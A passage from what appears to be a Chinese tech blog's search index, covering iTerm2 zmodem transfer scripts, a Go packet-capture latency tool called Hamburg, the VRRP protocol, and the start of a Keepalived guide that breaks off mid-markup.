class="line"><span class="comment"># AppleScript from http://stackoverflow.com/questions/4309087/cancel-button-on-osascript-in-a-bash-script  </span></span><br><span class="line"><span class="comment"># licensed under cc-wiki with attribution required   </span></span><br><span class="line"><span class="comment"># Remainder of script public domain  </span></span><br><span class="line">  </span><br><span class="line">osascript -e <span class="string">&#x27;tell application &quot;iTerm2&quot; to version&#x27;</span> &gt; /dev/null 2&gt;&amp;1 &amp;&amp; NAME=iTerm2 || NAME=iTerm  </span><br><span class="line"><span class="keyword">if</span> [ <span class="string">&quot;<span class="variable">$NAME</span>&quot;</span> = <span class="string">&quot;iTerm&quot;</span> ]; <span class="keyword">then</span>  </span><br><span class="line">    FILE=$(osascript -e <span class="string">&#x27;tell application &quot;iTerm&quot; to activate&#x27;</span> -e <span class="string">&#x27;tell application &quot;iTerm&quot; to set thefile to choose file with prompt &quot;Choose a file to send&quot;&#x27;</span> -e <span class="string">&quot;do shell script ( \&quot;echo \&quot;&amp;(quoted form of POSIX path of thefile as Unicode text)&amp;\&quot;\&quot; )&quot;</span>)  </span><br><span class="line"><span class="keyword">else</span>  </span><br><span class="line">    FILE=$(osascript -e <span class="string">&#x27;tell application &quot;iTerm2&quot; to activate&#x27;</span> -e <span class="string">&#x27;tell application &quot;iTerm2&quot; to set thefile to choose file with prompt &quot;Choose a file to send&quot;&#x27;</span> -e <span class="string">&quot;do shell script ( \&quot;echo \&quot;&amp;(quoted form of POSIX path of thefile as Unicode text)&amp;\&quot;\&quot; )&quot;</span>)  </span><br><span class="line"><span class="keyword">fi</span>  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">if</span> [ <span class="string">&quot;<span class="variable">$FILE</span>&quot;</span> = <span class="string">&quot;&quot;</span> ]; <span class="keyword">then</span>  </span><br><span class="line">    <span class="built_in">echo</span> Cancelled.  </span><br><span class="line">    <span class="comment"># Send ZModem cancel  </span></span><br><span class="line">    <span class="built_in">echo</span> \\x18\\x18\\x18\\x18\\x18  </span><br><span class="line">    <span class="built_in">sleep</span> 1  </span><br><span class="line">    <span class="built_in">echo</span>  </span><br><span class="line">    <span class="built_in">echo</span> \<span class="comment"># Cancelled transfer  </span></span><br><span class="line"><span class="keyword">else</span>  </span><br><span class="line">    /usr/local/bin/sz <span class="string">&quot;<span class="variable">$FILE</span>&quot;</span> --escape --binary --bufsize 4096  </span><br><span class="line">    <span class="built_in">sleep</span> 1  </span><br><span class="line">    <span class="built_in">echo</span>  </span><br><span class="line">    <span class="built_in">echo</span>  </span><br><span class="line">    <span class="built_in">echo</span> <span class="string">&quot;# Received <span class="variable">$FILE</span>&quot;</span>  </span><br><span class="line"><span class="keyword">fi</span></span><br></pre></td></tr></table></figure><ul><li>在 <code>/usr/local/bin</code> 目录中新增<code>iterm2-recv-zmodem.sh</code> 脚本（内容如下），并设置可执行权限：<code>chmod +x iterm2-recv-zmodem.sh</code></li></ul><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash  </span></span><br><span class="line"><span class="comment"># shellcheck shell=dash  </span></span><br><span class="line"><span class="comment"># Author: Matt Mastracci (matthew@mastracci.com)  </span></span><br><span class="line"><span class="comment"># AppleScript from http://stackoverflow.com/questions/4309087/cancel-button-on-osascript-in-a-bash-script  </span></span><br><span class="line"><span class="comment"># licensed under cc-wiki with attribution required   </span></span><br><span class="line"><span class="comment"># Remainder of script public domain  </span></span><br><span class="line">  </span><br><span class="line">osascript -e <span class="string">&#x27;tell application &quot;iTerm2&quot; to version&#x27;</span> &gt; /dev/null 2&gt;&amp;1 &amp;&amp; NAME=iTerm2 || NAME=iTerm  </span><br><span class="line"><span class="keyword">if</span> [ <span class="string">&quot;<span class="variable">$NAME</span>&quot;</span> = <span class="string">&quot;iTerm&quot;</span> ]; <span class="keyword">then</span>  </span><br><span class="line">    FILE=$(osascript -e <span class="string">&#x27;tell application &quot;iTerm&quot; to activate&#x27;</span> -e <span class="string">&#x27;tell application &quot;iTerm&quot; to set thefile to choose folder with prompt &quot;Choose a folder to place received files in&quot;&#x27;</span> -e <span class="string">&quot;do shell script (\&quot;echo \&quot;&amp;(quoted form of POSIX path of thefile as Unicode text)&amp;\&quot;\&quot;)&quot;</span>)  </span><br><span class="line"><span class="keyword">else</span>  </span><br><span class="line">    FILE=$(osascript -e <span class="string">&#x27;tell application &quot;iTerm2&quot; to activate&#x27;</span> -e <span class="string">&#x27;tell application &quot;iTerm2&quot; to set thefile to choose folder with prompt &quot;Choose a folder to place received files in&quot;&#x27;</span> -e <span class="string">&quot;do shell script (\&quot;echo \&quot;&amp;(quoted form of POSIX path of thefile as Unicode text)&amp;\&quot;\&quot;)&quot;</span>)  </span><br><span class="line"><span class="keyword">fi</span>  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">if</span> [ <span class="string">&quot;<span class="variable">$FILE</span>&quot;</span> = <span class="string">&quot;&quot;</span> ]; <span class="keyword">then</span>  </span><br><span class="line">    <span class="built_in">echo</span> Cancelled.  </span><br><span class="line">    <span class="comment"># Send ZModem cancel  </span></span><br><span class="line">    <span class="built_in">echo</span> \\x18\\x18\\x18\\x18\\x18  </span><br><span class="line">    <span class="built_in">sleep</span> 1  </span><br><span class="line">    <span class="built_in">echo</span>  </span><br><span class="line">    <span class="built_in">echo</span> \<span class="comment"># Cancelled transfer  </span></span><br><span class="line"><span class="keyword">else</span>  </span><br><span class="line">    <span class="built_in">cd</span> <span class="string">&quot;<span class="variable">$FILE</span>&quot;</span> || <span class="built_in">exit</span>  </span><br><span class="line">    /usr/local/bin/rz --rename --escape --binary --bufsize 4096   </span><br><span class="line">    <span class="built_in">sleep</span> 1  </span><br><span class="line">    <span class="built_in">echo</span>  </span><br><span class="line">    <span class="built_in">echo</span>  </span><br><span class="line">    <span class="built_in">echo</span> <span class="string">&quot;# Sent -&gt; <span class="variable">$FILE</span>&quot;</span>  </span><br><span class="line"><span class="keyword">fi</span></span><br></pre></td></tr></table></figure><ul><li>打开iTerm2软件，按照如下步骤配置 Triggers：<ul><li>打开 <code>Preferences...</code>；</li><li>选择 <code>Profiles</code> 标签页，并在左侧选择对应的 <code>Profile Name</code>；</li><li>点击右侧的 <code>Advanced</code> 标签页；</li><li>点击 <code>Triggers</code> 栏目下的 <code>Edit</code> 按钮，新增触发器，具体配置如下所示；</li></ul></li></ul><table><thead><tr><th align="center"><strong>Regular Expression</strong></th><th align="center"><strong>Action</strong></th><th align="center"><strong>Parameters</strong></th><th align="center"><strong>Instant</strong></th></tr></thead><tbody><tr><td align="center">rz waiting to receive.\*\*B0100</td><td align="center">Run Silent Coprocess…</td><td align="center">&#x2F;usr&#x2F;local&#x2F;bin&#x2F;iterm2-send-zmodem.sh</td><td align="center">checked</td></tr><tr><td align="center">\*\*B00000000000000</td><td align="center">Run Silent Coprocess…</td><td align="center">&#x2F;usr&#x2F;local&#x2F;bin&#x2F;iterm2-recv-zmodem.sh</td><td align="center">checked</td></tr></tbody></table><h2 id="三、实现逻辑"><a href="#三、实现逻辑" class="headerlink" title="三、实现逻辑"></a>三、实现逻辑</h2><ul><li>发送文件到终端的当前路径的实现逻辑：</li></ul><p><a href="https://cdn.bugwz.com/iterm2-rz.png"><img src="https://cdn.bugwz.com/iterm2-rz.png" alt="rz"></a></p><ul><li>从终端下载文件到本地的实现逻辑：</li></ul><p><a href="https://cdn.bugwz.com/iterm2-sz.png"><img src="https://cdn.bugwz.com/iterm2-sz.png" alt="sz"></a></p><h2 id="四、相关知识点"><a href="#四、相关知识点" class="headerlink" title="四、相关知识点"></a>四、相关知识点</h2><ul><li><a href="https://ss64.com/osx/osascript.html">osascript</a></li></ul>]]></content>
      
      
      
        <tags>
            
            <tag> iTerm2 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Hamburg - 抓包/耗时分析工具</title>
      <link href="/2020/07/27/hamburg/"/>
      <url>/2020/07/27/hamburg/</url>
      
        <content type="html"><![CDATA[<h2 id="一、简介"><a href="#一、简介" class="headerlink" title="一、简介"></a>一、简介</h2><p><code>Hamburg</code>是一款用<code>Go</code>实现的抓包&#x2F;耗时分析的工具，项目地址为 <a href="https://github.com/bugwz/hamburg">https://github.com/bugwz/hamburg</a>。该工具的设计思想以及实现逻辑基本参照<a href="https://github.com/git-hulk/tcpkit">tcpkit</a>。</p><h2 id="二、功能实现"><a href="#二、功能实现" class="headerlink" title="二、功能实现"></a>二、功能实现</h2><ul><li><code>抓包/拆包</code>：使用 <a href="https://github.com/google/gopacket">gopacket</a> 进行抓包以及<code>IP</code>&#x2F;<code>TCP</code>&#x2F;<code>UDP</code>等信息的解析；</li><li><code>耗时分析</code>：通过监听端口以及与本地监听网卡的IP地址比对，猜测数据包的请求方向（Request&#x2F;Response），并临时保存Request的数据包，在接收到与之匹配的回复数据包后，就可以计算出整个请求在本机的处理耗时。由于只要有一个回复数据包，整个请求回复链路的耗时统计就算完成，因此在server对于pipline的请求会批次回复的情况（redis等）下，耗时统计可能会偏小；</li><li><code>Lua自定义脚本</code>：通过使用<a href="github.com/yuin/gopher-lua">gopher-lua</a>包，支持使用自定义lua处理数据包；</li><li><code>应用层数据解析</code>：目前支持按照<code>raw</code>&#x2F;<code>dns</code>&#x2F;<code>http</code>&#x2F;<code>redis</code>&#x2F;<code>memcached</code>&#x2F;<code>mysql</code>等协议的数据解析。在收到多个<code>Request数据包</code>并且还没有相应的<code>Response数据包</code>的情况下会自动合并解析后的请求内容。<ul><li><strong>raw</strong>：仅输出<code>SequenceID</code>，<code>ACKNumber</code>，<code>PayloadLen</code>以及数据包的Flags（包含<code>FIN</code>&#x2F;<code>SYN</code>&#x2F;<code>RST</code>&#x2F;<code>PSH</code>&#x2F;<code>ACK</code>&#x2F;<code>URG</code>&#x2F;<code>ECE</code>&#x2F;<code>CWR</code>）等信息；</li><li><strong>dns</strong>：支持解析多种请求的类型，包含<code>A</code>&#x2F;<code>NS</code>&#x2F;<code>MD</code>&#x2F;<code>MF</code>&#x2F;<code>CNAME</code>&#x2F;<code>SOA</code>&#x2F;<code>MB</code>&#x2F;<code>MG</code>&#x2F;<code>MR</code>&#x2F;<code>NULL</code>&#x2F;<code>WKS</code>&#x2F;<code>PTR</code>&#x2F;<code>HINFO</code>&#x2F;<code>MINFO</code>&#x2F;<code>MX</code>&#x2F;<code>TXT</code>&#x2F;<code>AAAA</code>，而响应数据包支持的解析类型较少，目前仅有<code>A</code>和<code>CNAME</code>；</li><li><strong>http</strong>：支持所有类型的数据解析，不过输出的信息仅有<code>Method Type</code>，<code>Host</code>，<code>Resource Path</code>和<code>Response Code</code>；</li><li><strong>redis</strong>：支持大多数的请求访问类型，不统计noreply请求耗时，在pipline的场景下对于<code>multi bulk</code>的指令解析比tcpkit更准确；</li><li><strong>memcached</strong>：不统计noreply请求耗时；</li><li><strong>mysql</strong>：仅支持了部分client对server的请求的数据包的解析，对于server回复给client的数据包暂时没有做解析处理；</li></ul></li></ul><h2 id="三、示例"><a href="#三、示例" class="headerlink" title="三、示例"></a>三、示例</h2><h3 id="3-1、解析dns数据包"><a href="#3-1、解析dns数据包" class="headerlink" title="3.1、解析dns数据包"></a>3.1、解析dns数据包</h3><p>监听本地网卡<code>en0</code>，过滤包含IP为<code>192.168.1.101</code>和端口<code>53</code>的数据包，按照<code>dns</code>的解析规则解析payload，输出请求回复链路耗时<code>大于0ms</code>的信心，并打印回复数据包的内容；</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ go run main.go -i en0 -s 192.168.1.101 -p 53 -m dns -t 0 -a</span><br><span class="line"></span><br><span class="line">Name:  en0</span><br><span class="line">Description:</span><br><span class="line">Devices addresses:</span><br><span class="line">- IP address: 192.168.1.101</span><br><span class="line">- Subnet mask:  ffffff00</span><br><span class="line"></span><br><span class="line">Start capturing packet with filter: ((port 53) and ((host192.168.1.101)))</span><br><span class="line">2020-07-26 11:17:30 ||  192.168.1.101:45742 =&gt;       223.5.5.5:53    || 155µs || [AAAA] manshs1.tsdmain.org ||</span><br><span class="line">2020-07-26 11:17:30 ||  192.168.1.101:25138 =&gt;       223.5.5.5:53    || 162µs || [A] manshs1.tsdmain.org || [A] 215.33.36.57;</span><br><span class="line">2020-07-26 11:17:30 ||  192.168.1.101:25138 =&gt;  208.67.220.220:53    || 584µs || [A] manshs1.tsdmain.com || [A] 225.42.15.55;</span><br><span class="line">2020-07-26 11:17:33 ||  192.168.1.101:53488 =&gt;  208.67.220.220:53    || 575µs || [A] www.a.shifen.com || [A] 61.135.169.125/61.135.169.125;</span><br></pre></td></tr></table></figure><h3 id="3-2、解析redis数据包"><a href="#3-2、解析redis数据包" class="headerlink" title="3.2、解析redis数据包"></a>3.2、解析redis数据包</h3><p>监听本地网卡<code>en0</code>，过滤包含IP为<code>192.168.1.101</code>和端口<code>6379</code>的数据包，按照<code>redis</code>的解析规则解析payload，输出请求回复链路耗时<code>大于0ms</code>的信心；</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ go run main.go -i en0 -s 192.168.1.101 -p 6379 -m redis -t 0</span><br><span class="line"></span><br><span class="line">Name:  en0</span><br><span class="line">Description:</span><br><span class="line">Devices addresses:</span><br><span class="line">- IP address: 192.168.1.101</span><br><span class="line">- Subnet mask:  ffffff00</span><br><span class="line"></span><br><span class="line">Start capturing packet with filter: ((port 6379) and ((host 192.168.1.101)))</span><br><span class="line">2020-07-26 14:33:55 ||   192.168.1.203:55241 =&gt;   192.168.1.101:50396 || 408µs || COMMAND</span><br><span class="line">2020-07-26 14:33:57 ||   192.168.1.203:55241 =&gt;   192.168.1.101:50396 || 191µs || info</span><br><span class="line">2020-07-26 14:34:05 ||   192.168.1.203:55242 =&gt;   192.168.1.101:50396 || 193µs || info memory</span><br><span class="line">2020-07-26 14:34:19 ||   192.168.1.203:54311 =&gt;   192.168.1.101:50396 || 312µs || <span class="built_in">set</span> a 1000</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> GitHub </tag>
            
            <tag> Go </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Keepalived的高可用基石 - VRRP协议</title>
      <link href="/2020/06/20/keepalived-vrrp/"/>
      <url>/2020/06/20/keepalived-vrrp/</url>
      
        <content type="html"><![CDATA[<h2 id="一、背景"><a href="#一、背景" class="headerlink" title="一、背景"></a>一、背景</h2><p>路由实现了不同子网之间的数据通信，目前比较常用的路由配置方法大概分为两种：<code>动态路由</code>（利用RIP、OSPF进行动态学习）和<code>静态路由</code>（对终端设备静态配置路由）。动态路由可以通过学习的方式获取路由表，避免了静态路由需要手动配置以及后续变更的繁琐，但同时需要额外的占用线路带宽和CPU的处理时间。VRRP技术是在静态路由上用于在目标机器不可达之后的路由能够自动变更的一种实现手段。</p><h2 id="二、VRRP"><a href="#二、VRRP" class="headerlink" title="二、VRRP"></a>二、VRRP</h2><h3 id="2-1、简介"><a href="#2-1、简介" class="headerlink" title="2.1、简介"></a>2.1、简介</h3><p>VRRP(Virtual Router Redundancy Protocol)，即虚拟路由冗余协议，它是为了避免路由器出现单点故障的一种容错协议。VRRP协议的实现有<code>VRRPv2</code>和<code>VRRPv3</code>两个版本，<code>VRRPv2</code>基于<code>IPv4</code>，<code>VRRPv3</code>基于<code>IPv6</code>。相关RFC文件为：<a href="https://tools.ietf.org/html/rfc2338">RFC2338 - Virtual Router Redundancy Protocol</a>, <a href="https://tools.ietf.org/html/rfc3768">RFC3768 - Virtual Router Redundancy Protocol (VRRP)</a>, <a href="https://tools.ietf.org/html/rfc5798">RFC5798 - Virtual Router Redundancy Protocol (VRRP) Version 3 for IPv4 and IPv6</a>。</p><h3 id="2-2、基础概念"><a href="#2-2、基础概念" class="headerlink" title="2.2、基础概念"></a>2.2、基础概念</h3><ul><li><code>VIP</code>：Virtual IP, 即虚拟IP，是一个不与特定计算机或网络接口卡(NIC)相连的IP地址；</li><li><code>VRRP路由器</code>：运行VRRP协议的路由器（或设备），它可能属于一个或多个虚拟路由器；</li><li><code>Master路由器</code>：承担转发报文任务的VRRP设备；</li><li><code>Backup路由器</code>：一组没有担转发任务的VRRP设备，当Master设备出现故障时，它们将通过竞选成为新的Master设备；</li><li><code>虚拟路由器</code>：由一组<code>VRRP路由器</code>组成，抽象成一个虚拟的路由器。它拥有一个<code>虚拟路由器标识符（VRID）</code>和一个（或多个）<code>VIP</code>；</li><li><code>虚拟MAC地址</code>：即虚拟路由器根据VRID生成的MAC地址，一个虚拟路由器拥有一个虚拟MAC地址，当虚拟路由器回应ARP请求时，回复虚拟MAC地址，而不是接口的真实MAC地址，格式为：<code>00-00-5E-00-01-&#123;VRID&#125;(VRRP for IPv4)</code>，<code>00-00-5E-00-02-&#123;VRID&#125;(VRRP for IPv6)</code>，<strong>从VRID的用途可以看出VRID的取值范围是0～255</strong>；</li><li><code>IP地址拥有者（IP Address Owner）</code>：如果一个<code>VRRP路由器</code>将<code>VIP</code>作为真实的接口地址，则该设备是IP地址拥有者，当这台设备正常工作时，它会响应<code>目的地址</code>是VIP的报文，如ping、TCP连接等；</li><li><code>优先级（Priority）</code>：用来标识虚拟路由器中各成员路由器的优先级，<code>虚拟路由器</code>根据优先级选举出<code>Master</code>和<code>Backup</code>；</li></ul><h3 id="2-3、报文"><a href="#2-3、报文" class="headerlink" title="2.3、报文"></a>2.3、报文</h3><p>VRRP协议报文用来将<code>Master设备</code>的<code>优先级</code>和<code>状态</code>通告给同一备份组的所有<code>Backup设备</code>。VRRP协议报文封装在IP报文中，发送到分配给VRRP的IP组播地址。</p><ul><li>IP报文头中，源地址为发送报文接口的主IP地址（不是虚拟IP地址），目的地址是224.0.0.18，TTL是255，协议号是112；</li><li>IP报文头中，TTL必须为255，当VRRP路由器收到TTL不等于255的VRRP协议报文后，必须丢弃；</li></ul><h4 id="2-3-1、VRRPv2报文"><a href="#2-3-1、VRRPv2报文" class="headerlink" title="2.3.1、VRRPv2报文"></a>2.3.1、VRRPv2报文</h4><ul><li>仅适用于IPv4网络；</li><li>为了兼容早期版本（RFC2338），VRRPv2版本保留报文的认证字段，但是VRRP认证并不能提高安全性；</li><li>秒级的通告报文的发送时间间隔；</li></ul><p><img src="https://cdn.bugwz.com/vrrpv2.png" alt="VRRPv2"></p><h4 id="2-3-2、VRRPv3报文"><a href="#2-3-2、VRRPv3报文" class="headerlink" title="2.3.2、VRRPv3报文"></a>2.3.2、VRRPv3报文</h4><ul><li>适用于IPv4和IPv6两种网络；</li><li>不支持认证功能；</li><li>厘秒级（100分之1秒）的通告报文的发送时间间隔；</li></ul><p><img src="https://cdn.bugwz.com/vrrpv3.png" alt="VRRPv3"></p><h4 id="2-3-3、报文字段含义"><a href="#2-3-3、报文字段含义" class="headerlink" title="2.3.3、报文字段含义"></a>2.3.3、报文字段含义</h4><ul><li><code>Version</code>：长度<strong>4比特</strong>，指VRRP协议版本，VRRPv2此字段为2，VRRPv3此字段为3；</li><li><code>Type</code>：长度<strong>4比特</strong>，定义了VRRP报文的类型，本版本的协议仅定义了一个报文类型：<ul><li><code>1</code>：Advertisement 带有未知类型的报文必须被丢弃；</li></ul></li><li><code>Virtual Rtr ID8</code>：长度<strong>8比特</strong>，虚拟路由器标识（VRID）字段标识了此报文所报告状态的虚拟路由器。可配置的范围是1–255。没有缺省值；</li><li><code>Priority</code>：长度<strong>8比特</strong>，申明了发送此报文的VRRP路由器的优先级。值越高优先级越高。如果VRRP路由器是虚拟路由器地址的IP地址所有者，那么其优先级必须为255。备用作用的VRRP路由器的优先级必须在1–254之间。缺省的VRRP路由器优先级为100。优先级值0 用于指示当前虚拟路由器的主路由器停止参与VRRP组。主要用于触发备用路由器快速地迁移到主路由器，而不用等待当前主路由器超时；</li><li><code>Count IP Addrs</code>：长度<strong>8比特</strong>。在此VRRP通告中包含的IP地址的数量；</li><li><code>Auth Type</code>：长度<strong>8比特</strong>，用于标识要用到的认证方法。在一个虚拟路由器组内认证类型是唯一的。如果报文携带未知的认证类型或者该认证类型和本地配置的认证方法不匹配，那么该报文必须被丢弃。目前定义的认证方法有：<ul><li><code>0(No Authentication)</code> : 表明VRRP协议报文的交换不需要认证。在发送VRRP协议报文时，<code>Authentication Data</code> 字段将被置为<code>0</code>，而在接收协议报文时，<code>Authentication Data</code> 字段被忽略；</li><li><code>1(Simple Text Password)</code>: 表示明文认证方式。</li><li><code>2(IP Authentication Header)</code>：表示MD5认证方式；</li></ul></li><li><code>Adver Int</code>：长度<strong>8比特</strong>，VRRP通告间隔时间，单位为秒（默认为1秒），这个字段主要用于错误配置路由器时的故障定位和解决；</li><li><code>Checksum</code>：长度<strong>16比特</strong>，16位校验和，用于检测VRRP报文中的数据破坏情况；</li><li><code>IP Address</code>：长度<strong>32比特</strong>，VRRP备份组的虚拟IPv4地址或者虚拟IPv6地址；</li><li><code>Authentication Data</code>：长度<strong>32比特</strong>，VRRP报文的认证字，目前只有明文认证和MD5认证才用到该部分，对于其它认证方式，一律填0；</li></ul><h3 id="2-4、工作原理"><a href="#2-4、工作原理" class="headerlink" title="2.4、工作原理"></a>2.4、工作原理</h3><h4 id="2-4-1、状态机"><a href="#2-4-1、状态机" class="headerlink" title="2.4.1、状态机"></a>2.4.1、状态机</h4><ul><li><code>初始状态(Initialize)</code>：该状态下VRRP处于<code>不可用</code>的状态，在此状态下设备不会对VRRP报文做任何处理，通常刚配置VRRP时或设备检测到故障时会进入该状态。收到接口startup（启动）的状态，如果设备的优先级为<code>255</code>（表示该设备为虚拟路由器IP地址拥有者），则直接成为Master设备。如果设备的优先级小于255，则会先切换到<code>Backup状态</code>。</li><li><code>活动状态(Master)</code>：处于该状态下的设备为Master设备，Master设备会做如下工作：<ul><li>定时发送VRRP通告报文，时间间隔为<code>Advertisement_Interval</code>；</li><li>以虚拟MAC地址相应对虚拟IP地址的ARP请求；</li><li>转发目的MAC地址为虚拟MAC地址的IP报文；</li><li>抢占模式下，如果收到比自己优先级大的VRRP报文，或者跟自己优先级相等，且本地接口IP地址小于源端接口IP地址时，则转变为Backup状态；</li><li>收到Shutdown(关闭)消息后，则立即转变为<code>初始状态(Initialize)</code>；</li></ul></li><li><code>备份状态(Backup)</code>：处于该状态下的设备接收Master发送的VRRP通告报文，判断Master是否正常。如果一定时间间隔没有收到VRRP通告报文，即<code>Master_Down_Interval（Master_Down_Interval = 3 * Advertisement_Interval + Skew_time</code> 超时，则判断为Master故障。<ul><li>接收Master发送的<code>VRRP通告报文</code>，判断Master是否正常；</li><li>对虚拟IP的ARP请求不做响应；</li><li>丢弃目的MAC地址为虚拟路由器MAC地址的IP报文；</li><li>丢弃目的IP地址为虚拟路由器IP地址的IP报文；</li><li>如果收到优先级比自己高，或与自己相等的VRRP报文，则重置<code>Master_Down_Interval定时器</code>（不进一步比较IP地址）；</li><li>如果收到优先级比自己小的VPPR报文，且优先级为0时，（表示原Master设备声明不参与该VRRP组了），定时器时间设置为Skew_time（偏移时间，<code>Skew_time= (256 - priority)/256）</code>；</li><li>如果收到优先级比自己小的VPPR报文，且优先级不为0时，丢弃该报文，立即转变为Master状态；</li><li><code>Master_Down_Interval定时器</code>超时，立即转变为Master状态；</li><li>收到Shutdown（关闭）消息后，则立即转变为<code>初始状态(Initialize)</code>；</li></ul></li></ul><h2 id="三、参考地址"><a href="#三、参考地址" class="headerlink" title="三、参考地址"></a>三、参考地址</h2><ul><li><a href="https://www.cnblogs.com/clsn/p/8052649.html">https://www.cnblogs.com/clsn/p/8052649.html</a></li><li><a href="https://cshihong.github.io/2017/12/18/%E8%99%9A%E6%8B%9F%E8%B7%AF%E7%94%B1%E5%86%97%E4%BD%99%E5%8D%8F%E8%AE%AE-VRRP/">https://cshihong.github.io/2017/12/18/%E8%99%9A%E6%8B%9F%E8%B7%AF%E7%94%B1%E5%86%97%E4%BD%99%E5%8D%8F%E8%AE%AE-VRRP/</a></li></ul>]]></content>
      
      
      
        <tags>
            
            <tag> Linux </tag>
            
            <tag> Keepalived </tag>
            
            <tag> VRRP </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Keepalived的学习与使用</title>
      <link href="/2020/06/16/keepalived/"/>
      <url>/2020/06/16/keepalived/</url>
      
        <content type="html"><![CDATA[<h2 id="一、简介"><a href="#一、简介" class="headerlink" title="一、简介"></a>一、简介</h2><p><a href="https://www.keepalived.org/">Keepalived</a> 软件起初是专为LVS负载均衡软件设计的，用来监控管理LVS集群系统中各个服务节点的状态，后来又加入了可以解决静态路由单点故障问题从而实现高可用的<a href="https://wikipedia.org/wiki/Virtual_Router_Redundancy_Protocol">VRRP</a>功能。因此，<a href="https://www.keepalived.org/">Keepalived</a> 除了能够管理LVS软件外，还可以作为其他服务（例如<a href="https://nginx.org/en/">Nginx</a>、<a href="http://www.haproxy.org/">Haproxy</a>、<a href="https://www.mysql.com/">MySQL</a>等）的高可用解决方案软件。</p><h3 id="1-1、安装部署"><a href="#1-1、安装部署" class="headerlink" title="1.1、安装部署"></a>1.1、安装部署</h3><p>通过<a href="https://www.keepalived.org/download.html">官网下载</a> 或者 <a href="https://github.com/acassen/keepalived">GitHub</a> 下载源码进行编译安装，由于<a href="https://www.keepalived.org/">Keepalived</a> 使用了<a href="https://packages.debian.org/sid/libpopt-dev">libpopt库</a>用来解析命令行参数，因此我们也需要安装<code>libpopt</code>库。</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 安装libpopt</span></span><br><span class="line">yum install popt-devel</span><br><span class="line"></span><br><span class="line"><span class="comment"># 进入keepalived源码目录编译安装</span></span><br><span class="line">./configure</span><br><span class="line">make &amp;&amp; make install</span><br></pre></td></tr></table></figure><h3 id="1-2、配置"><a href="#1-2、配置" class="headerlink" title="1.2、配置"></a>1.2、配置</h3><p>针对版本 <a href="https://github.com/acassen/keepalived/releases/tag/v2.1.2">2.1.2</a>，配置大致分为如下几大类：</p><ul><li><code>global_defs</code> : 主要是配置故障发生时的通知对象以及机器标识；</li><li><code>vrrp_instance</code> : 用来定义对外提供服务的VIP区域及其相关属性；</li><li><code>virtual_server</code> : 虚拟服务器，来源<code>vrrp_instance</code>中配置的虚拟IP地址，后面加空格加端口号；</li></ul><p>详细配置可参考源码中的 <code>./doc/samples/*.conf</code> 等配置文件，关于配置文件的各参数的详细解析可以参考 <a href="https://www.keepalived.org/manpage.html">官方文档</a></p><h3 id="1-3、组件介绍"><a href="#1-3、组件介绍" class="headerlink" title="1.3、组件介绍"></a>1.3、组件介绍</h3><ul><li><code>core</code>：keepalived的核心组件，负责主进程的启动和维护，全局配置文件的加载解析等；</li><li><code>check</code>：负责healthchecker(健康检查)，包括了各种健康检查方式，以及对应的配置的解析包括LVS的配置解析；</li><li><code>vrrp</code>：VRRPD子进程，VRRPD子进程就是来实现VRRP协议的；</li><li><code>libipfwc</code>：iptables(ipchains)库，配置LVS会用到；</li><li><code>libipvs*</code>：配置LVS会用到（keepalived和LVS完全是两码事，只不过他们各负其责相互配合而已）；</li></ul><h2 id="二、工作模式"><a href="#二、工作模式" class="headerlink" title="二、工作模式"></a>二、工作模式</h2><h3 id="2-1、双主模式-抢占模式"><a href="#2-1、双主模式-抢占模式" class="headerlink" title="2.1、双主模式(抢占模式)"></a>2.1、双主模式(抢占模式)</h3><p>配置以及实际的主备说明：</p><ul><li><code>state</code> : 该参数都为<code>MASTER</code>；</li><li><code>priority</code> : 竞选优先级数值，该参数的大小决定实际的主备；<ul><li>参数值不同：参数值较大的为主，从而进行抢占；</li><li>参数值相同：后启动的为主，从而进行抢占；</li></ul></li></ul><h3 id="2-2、主备模式-抢占模式"><a href="#2-2、主备模式-抢占模式" class="headerlink" title="2.2、主备模式(抢占模式)"></a>2.2、主备模式(抢占模式)</h3><p>配置以及实际的主备说明：</p><ul><li><code>state</code> : 该参数配置为<code>MASTER</code>和<code>BACKUP</code>；</li><li><code>priority</code> : 竞选优先级数值，该参数与<code>state</code>值共同决定实际的主备；<ul><li>该参数值不同：参数值较大的为主，从而进行抢占；</li><li>该参数值相同：<code>state</code>参数为<code>MASTER</code>的为实际的主，从而进行抢占；</li></ul></li></ul><h3 id="2-3、双备模式-抢占-x2F-非抢占模式"><a href="#2-3、双备模式-抢占-x2F-非抢占模式" class="headerlink" title="2.3、双备模式(抢占&#x2F;非抢占模式)"></a>2.3、双备模式(抢占&#x2F;非抢占模式)</h3><p>配置以及实际的主备说明：</p><ul><li><code>state</code> : 该参数配置为<code>BACKUP</code>；</li><li><code>priority</code> : 竞选优先级数值，该参数与<code>state</code>值共同决定实际的主备；<ul><li>该参数值不同: 参数值较大的为主，从而进行抢占；</li><li>该参数值相同: 先启动的为主，后启动的为备；</li></ul></li><li><code>nopreempt</code> : 是否启用非抢占模式，该参数只在双备模式下适用;<ul><li>开启: 新启动的永远是备，不进行抢占；</li><li>关闭: 主备关系依据其他逻辑判断，从而决定是否执行抢占；</li></ul></li></ul><h2 id="三、消息链路"><a href="#三、消息链路" class="headerlink" title="三、消息链路"></a>三、消息链路</h2><p>以下所说的主节点和备节点为实际的主备；</p><ul><li><code>心跳通知</code>: 主节点会不断地向备节点发送（多播的方式，默认的多播地址为<code>224.0.0.18</code>）心跳消息，用以告诉备节点自己还活着；</li><li><code>故障检测并接管资源</code>: 当主节点发生故障时，就无法发送心跳消息， 备节点无法继续检测到来自主节点的心跳，于是调用自身的接管程序，接管 原主节点的IP资源及服务;</li><li><code>故障恢复</code>：当原主节点的故障恢复后，依据配置决定是否抢占当前活跃节点的IP资源和服务；</li></ul><h2 id="四、脑裂Split-brain"><a href="#四、脑裂Split-brain" class="headerlink" title="四、脑裂Split-brain"></a>四、脑裂<a href="https://en.wikipedia.org/wiki/Split-brain">Split-brain</a></h2><h3 id="4-1、背景"><a href="#4-1、背景" class="headerlink" 